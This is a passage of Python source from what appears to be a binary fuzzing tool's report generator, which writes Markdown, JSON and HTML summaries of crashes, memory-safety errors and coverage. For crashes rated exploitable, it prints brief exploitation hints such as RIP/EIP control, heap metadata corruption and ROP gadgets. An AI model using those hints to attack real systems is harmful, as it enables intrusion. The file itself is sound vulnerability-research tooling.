        Generate a comprehensive Markdown report for a fuzzing session.
        
        Args:
            session: Session statistics
            crashes: List of crash buckets
            memory_safety_report: Memory safety analysis results
            coverage_stats: Coverage statistics
            include_poc: Whether to include PoC guidance
            
        Returns:
            Markdown formatted report
        """
        lines = []
        
        # Header
        lines.append("# 🔬 Binary Fuzzing Security Report")
        lines.append("")
        lines.append(f"**Session ID:** `{session.get('id', 'Unknown')}`")
        lines.append(f"**Target:** `{session.get('target_path', 'Unknown')}`")
        lines.append(f"**Generated:** {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}")
        lines.append("")
        
        # Executive Summary
        unique_crashes = session.get('unique_crashes', 0)
        exploitable = session.get('exploitable_errors', 0)
        total_execs = session.get('total_executions', 0)
        
        risk_level = "Critical" if exploitable > 0 else (
            "High" if unique_crashes > 5 else (
                "Medium" if unique_crashes > 0 else "Low"
            )
        )
        risk_emoji = {"Critical": "🔴", "High": "🟠", "Medium": "🟡", "Low": "🟢"}.get(risk_level, "⚪")
        
        lines.append("---")
        lines.append("")
        lines.append("## 📊 Executive Summary")
        lines.append("")
        lines.append(f"### {risk_emoji} Risk Level: {risk_level}")
        lines.append("")
        lines.append(f"The fuzzing session executed **{total_execs:,}** test cases against the target binary, ")
        lines.append(f"discovering **{unique_crashes}** unique crashes")
        if exploitable > 0:
            lines.append(f" including **{exploitable}** potentially exploitable vulnerabilities.")
        else:
            lines.append(".")
        lines.append("")
        
        # Session Statistics
        lines.append("---")
        lines.append("")
        lines.append("## ⚙️ Session Statistics")
        lines.append("")
        lines.append("| Metric | Value |")
        lines.append("|--------|-------|")
        lines.append(f"| Total Executions | {total_execs:,} |")
        lines.append(f"| Execution Rate | {session.get('executions_per_second', 0):.1f}/sec |")
        lines.append(f"| Total Crashes | {session.get('total_crashes', 0):,} |")
        lines.append(f"| Unique Crashes | {unique_crashes} |")
        lines.append(f"| Timeouts | {session.get('total_timeouts', 0):,} |")
        lines.append(f"| Coverage | {session.get('coverage_percentage', 0):.2f}% |")
        lines.append(f"| Edges Discovered | {session.get('total_edges_discovered', 0):,} |")
        lines.append(f"| Corpus Size | {session.get('corpus_size', 0)} |")
        lines.append(f"| Status | {session.get('status', 'Unknown')} |")
        lines.append("")
        
        # Memory Safety Stats
        if memory_safety_report:
            lines.append("---")
            lines.append("")
            lines.append("## 🛡️ Memory Safety Analysis")
            lines.append("")
            
            stats = memory_safety_report.get('session_stats', {})
            lines.append("| Error Type | Count |")
            lines.append("|------------|-------|")
            lines.append(f"| Heap Errors | {stats.get('heap_errors', 0)} |")
            lines.append(f"| Stack Errors | {stats.get('stack_errors', 0)} |")
            lines.append(f"| Use-After-Free | {stats.get('uaf_errors', 0)} |")
            lines.append(f"| Exploitable | {stats.get('exploitable_errors', 0)} |")
            lines.append("")
            
            # Error distribution
            error_dist = memory_safety_report.get('error_type_distribution', {})
            if error_dist:
                lines.append("### Error Type Distribution")
                lines.append("")
                for error_type, count in sorted(error_dist.items(), key=lambda x: -x[1]):
                    lines.append(f"- **{error_type}:** {count}")
                lines.append("")
            
            # Recommendations
            recs = memory_safety_report.get('recommendations', [])
            if recs:
                lines.append("### 💡 Recommendations")
                lines.append("")
                for rec in recs[:10]:
                    lines.append(f"- {rec}")
                lines.append("")
        
        # Crash Details
        if crashes:
            lines.append("---")
            lines.append("")
            lines.append("## 💥 Crash Analysis")
            lines.append("")
            
            # Sort by severity
            severity_order = {"EXPLOITABLE": 0, "PROBABLY_EXPLOITABLE": 1, "HIGH": 2, "MEDIUM": 3, "LOW": 4, "UNKNOWN": 5}
            sorted_crashes = sorted(
                crashes, 
                key=lambda x: severity_order.get(x.get('severity', 'UNKNOWN'), 99)
            )
            
            for i, crash in enumerate(sorted_crashes[:20], 1):
                severity = crash.get('severity', 'UNKNOWN')
                sev_emoji = {
                    "EXPLOITABLE": "🔴",
                    "PROBABLY_EXPLOITABLE": "🟠",
                    "HIGH": "🟡",
                    "MEDIUM": "🟡",
                    "LOW": "🟢",
                }.get(severity, "⚪")
                
                crash_type = crash.get('crash_type', 'Unknown')
                sample_count = crash.get('sample_count', 0)
                
                lines.append(f"### {sev_emoji} Crash #{i}: {crash_type}")
                lines.append("")
                lines.append(f"- **Bucket ID:** `{crash.get('id', 'N/A')}`")
                lines.append(f"- **Severity:** {severity}")
                lines.append(f"- **Type:** {crash_type}")
                lines.append(f"- **Sample Count:** {sample_count}")
                lines.append(f"- **Stack Hash:** `{crash.get('stack_hash', 'N/A')[:16]}...`")
                lines.append(f"- **First Seen:** {crash.get('first_seen', 'N/A')}")
                lines.append("")
                
                # Exploitation guidance for high-severity crashes
                if include_poc and severity in ("EXPLOITABLE", "PROBABLY_EXPLOITABLE"):
                    lines.append("#### 🎯 Exploitation Potential")
                    lines.append("")
                    
                    if crash_type == "SEGFAULT":
                        lines.append("This segmentation fault indicates memory corruption that may be exploitable.")
                        lines.append("- Check for controlled write-what-where conditions")
                        lines.append("- Analyze register state at crash time")
                        lines.append("- Look for RIP/EIP control possibilities")
                    elif "heap" in crash_type.lower():
                        lines.append("Heap corruption vulnerabilities often lead to code execution.")
                        lines.append("- Analyze allocation/free patterns")
                        lines.append("- Check for heap metadata corruption")
                        lines.append("- Look for UAF or double-free conditions")
                    elif "stack" in crash_type.lower():
                        lines.append("Stack-based vulnerabilities may allow return address overwrite.")
                        lines.append("- Check for stack buffer overflow")
                        lines.append("- Analyze stack canary presence")
                        lines.append("- Look for ROP gadgets in binary")
                    
                    lines.append("")
            
            if len(crashes) > 20:
                lines.append(f"*... and {len(crashes) - 20} more crashes not shown*")
                lines.append("")
        
        # Coverage Analysis
        if coverage_stats:
            lines.append("---")
            lines.append("")
            lines.append("## 📈 Coverage Analysis")
            lines.append("")
            
            lines.append(f"- **Total Edges:** {coverage_stats.get('total_edges_discovered', 0):,}")
            lines.append(f"- **Coverage Percentage:** {coverage_stats.get('coverage_pct', 0):.2f}%")
            lines.append(f"- **Favored Inputs:** {coverage_stats.get('favored_inputs', 0)}")
            lines.append(f"- **New Coverage Inputs:** {coverage_stats.get('new_coverage_inputs', 0)}")
            lines.append("")
            
            # Edge hit distribution
            if 'hit_count_distribution' in coverage_stats:
                lines.append("### Edge Hit Distribution")
                lines.append("")
                lines.append("| Hits | Edge Count |")
                lines.append("|------|------------|")
                for bucket, count in coverage_stats['hit_count_distribution'].items():
                    lines.append(f"| {bucket} | {count} |")
                lines.append("")
        
        # Remediation
        lines.append("---")
        lines.append("")
        lines.append("## 🔧 Remediation Recommendations")
        lines.append("")
        
        if unique_crashes > 0:
            lines.append("### Immediate Actions")
            lines.append("")
            lines.append("1. **Triage crashes by severity** - Focus on EXPLOITABLE and PROBABLY_EXPLOITABLE first")
            lines.append("2. **Generate PoC scripts** - Use the `/generate-poc` endpoint for each crash")
            lines.append("3. **Minimize crash inputs** - Use `/minimize-crash` to find smallest reproducer")
            lines.append("4. **Root cause analysis** - Debug with GDB using the minimized input")
            lines.append("")
            
            lines.append("### Code Fixes")
            lines.append("")
            lines.append("- Review all memory allocation and deallocation patterns")
            lines.append("- Add bounds checking for array/buffer operations")
            lines.append("- Use memory-safe functions (strncpy vs strcpy)")
            lines.append("- Enable compiler security features (ASLR, stack canaries, PIE)")
            lines.append("")
        else:
            lines.append("No crashes were detected in this fuzzing session. Consider:")
            lines.append("")
            lines.append("- Running longer with more iterations")
            lines.append("- Adding more diverse seed inputs")
            lines.append("- Enabling sanitizers (ASan, MSan, UBSan)")
            lines.append("- Using dictionary-based fuzzing for structured inputs")
            lines.append("")
        
        # Footer
        lines.append("---")
        lines.append("")
        lines.append("*Report generated by VRAgent Binary Fuzzer*")
        lines.append("")
        
        return "\n".join(lines)
    
    @staticmethod
    def generate_json_report(
        session: Dict[str, Any],
        crashes: List[Dict[str, Any]],
        memory_safety_report: Optional[Dict[str, Any]] = None,
        coverage_stats: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """
        Generate a JSON report for a fuzzing session.
        
        Returns:
            JSON-serializable dictionary
        """
        unique_crashes = session.get('unique_crashes', 0)
        exploitable = session.get('exploitable_errors', 0)
        
        risk_level = "critical" if exploitable > 0 else (
            "high" if unique_crashes > 5 else (
                "medium" if unique_crashes > 0 else "low"
            )
        )
        
        return {
            "report_type": "binary_fuzzing",
            "version": "1.0",
            "generated_at": datetime.utcnow().isoformat(),
            "risk_assessment": {
                "level": risk_level,
                "unique_crashes": unique_crashes,
                "exploitable_count": exploitable,
            },
            "session": session,
            "crashes": crashes,
            "memory_safety": memory_safety_report,
            "coverage": coverage_stats,
            "summary": {
                "total_executions": session.get('total_executions', 0),
                "execution_rate": session.get('executions_per_second', 0),
                "total_crashes": session.get('total_crashes', 0),
                "unique_crashes": unique_crashes,
                "timeouts": session.get('total_timeouts', 0),
                "coverage_percentage": session.get('coverage_percentage', 0),
            },
        }
    
    @staticmethod
    def generate_html_report(
        session: Dict[str, Any],
        crashes: List[Dict[str, Any]],
        memory_safety_report: Optional[Dict[str, Any]] = None,
        coverage_stats: Optional[Dict[str, Any]] = None,
    ) -> str:
        """
        Generate an HTML report for a fuzzing session.
        
        Returns:
            HTML string
        """
        # Generate markdown first, then convert to HTML
        markdown_content = FuzzingReportGenerator.generate_markdown_report(
            session, crashes, memory_safety_report, coverage_stats
        )
        
        # Simple markdown to HTML conversion
        html_lines = [
            "<!DOCTYPE html>",
            "<html>",
            "<head>",
            "    <meta charset='utf-8'>",
            "    <title>Binary Fuzzing Report</title>",
            "    <style>",
            "        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; ",
            "               max-width: 1200px; margin: 0 auto; padding: 20px; background: #1e1e1e; color: #d4d4d4; }",
            "        h1, h2, h3, h4 { color: #569cd6; }",
            "        table { border-collapse: collapse; width: 100%; margin: 10px 0; }",
            "        th, td { border: 1px solid #3c3c3c; padding: 8px 12px; text-align: left; }",
            "        th { background: #2d2d2d; color: #9cdcfe; }",
            "        tr:nth-child(even) { background: #2a2a2a; }",
            "        code { background: #2d2d30; padding: 2px 6px; border-radius: 3px; font-family: 'Consolas', monospace; }",
            "        pre { background: #2d2d30; padding: 15px; border-radius: 5px; overflow-x: auto; }",
            "        hr { border: none; border-top: 1px solid #3c3c3c; margin: 20px 0; }",
            "        ul, ol { margin: 10px 0; padding-left: 25px; }",
            "        li { margin: 5px 0; }",
            "        .critical { color: #f44747; }",
            "        .high { color: #ce9178; }",
            "        .medium { color: #dcdcaa; }",
            "        .low { color: #4ec9b0; }",
            "    </style>",
            "</head>",
            "<body>",
        ]
        
        # Convert markdown to basic HTML
        import re
        
        in_table = False
        in_code_block = False
        
        for line in markdown_content.split('\n'):
            # Headers
            if line.startswith('# '):
                html_lines.append(f"<h1>{line[2:]}</h1>")
            elif line.startswith('## '):
                html_lines.append(f"<h2>{line[3:]}</h2>")
            elif line.startswith('### '):
                html_lines.append(f"<h3>{line[4:]}</h3>")
            elif line.startswith('#### '):
                html_lines.append(f"<h4>{line[5:]}</h4>")
            # Horizontal rule
            elif line.startswith('---'):
                html_lines.append("<hr>")
            # Table
            elif '|' in line and not line.startswith('*'):
                cells = [c.strip() for c in line.split('|')[1:-1]]
                if all(c.replace('-', '') == '' for c in cells):
                    continue  # Skip separator row
                if not in_table:
                    html_lines.append("<table>")
                    in_table = True
                    html_lines.append("<tr>" + "".join(f"<th>{c}</th>" for c in cells) + "</tr>")
                else:
                    html_lines.append("<tr>" + "".join(f"<td>{c}</td>" for c in cells) + "</tr>")
            else:
                if in_table:
                    html_lines.append("</table>")
                    in_table = False
                # List items
                if line.startswith('- '):
                    html_lines.append(f"<li>{line[2:]}</li>")
                elif re.match(r'^\d+\. ', line):
                    html_lines.append(f"<li>{line.split('. ', 1)[1]}</li>")
                # Code
                elif line.startswith('```'):
                    if in_code_block:
                        html_lines.append("</pre></code>")
                        in_code_block = False
                    else:
                        html_lines.append("<code><pre>")
                        in_code_block = True
                # Regular paragraph
                elif line.strip():
                    # Replace inline code
                    line = re.sub(r'`([^`]+)`', r'<code>\1</code>', line)
                    # Replace bold
                    line = re.sub(r'\*\*([^*]+)\*\*', r'<strong>\1</strong>', line)
                    html_lines.append(f"<p>{line}</p>")
        
        if in_table:
            html_lines.append("</table>")
        
        html_lines.extend([
            "</body>",
            "</html>",
        ])
        
        return '\n'.join(html_lines)


def generate_fuzzing_report(
    session_id: str,
    format: str = "markdown",
    output_path: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Generate a comprehensive report for a fuzzing session.
    
    Args:
        session_id: Fuzzing session ID
        format: Output format (markdown, json, html)
        output_path: Optional output file path
        
    Returns:
        Report generation result
    """
    # Get session
    fuzzer = _active_fuzzers.get(session_id)
    if not fuzzer:
        return {"success": False, "error": "Session not found or no longer active"}
    
    session = fuzzer.get_session()
    crashes = fuzzer.get_crashes()
    memory_safety = fuzzer.get_memory_safety_report()
    
    coverage_stats = None
    if fuzzer.coverage_guided:
        coverage_stats = fuzzer.coverage_tracker.get_stats()
    
    # Generate report
    if format == "markdown":
        content = FuzzingReportGenerator.generate_markdown_report(
            session, crashes, memory_safety, coverage_stats
        )
        ext = ".md"
        content_type = "text/markdown"
    elif format == "json":
        report = FuzzingReportGenerator.generate_json_report(
            session, crashes, memory_safety, coverage_stats
        )
        content = json.dumps(report, indent=2, default=str)
        ext = ".json"
        content_type = "application/json"
    elif format == "html":
        content = FuzzingReportGenerator.generate_html_report(
            session, crashes, memory_safety, coverage_stats
        )
        ext = ".html"
        content_type = "text/html"
    else:
        return {"success": False, "error": f"Unknown format: {format}"}
    
    # Save if output path provided
    if output_path:
        final_path = output_path
    else:
        final_path = os.path.join(
            fuzzer.output_dir,
            "reports",
            f"fuzzing_report_{session_id}{ext}"
        )
    
    os.makedirs(os.path.dirname(final_path), exist_ok=True)
    with open(final_path, "w") as f:
        f.write(content)
    
    return {
        "success": True,
        "format": format,
        "path": final_path,
        "content_type": content_type,
        "session_id": session_id,
        "content_preview": content[:1000] + "..." if len(content) > 1000 else content,
    }
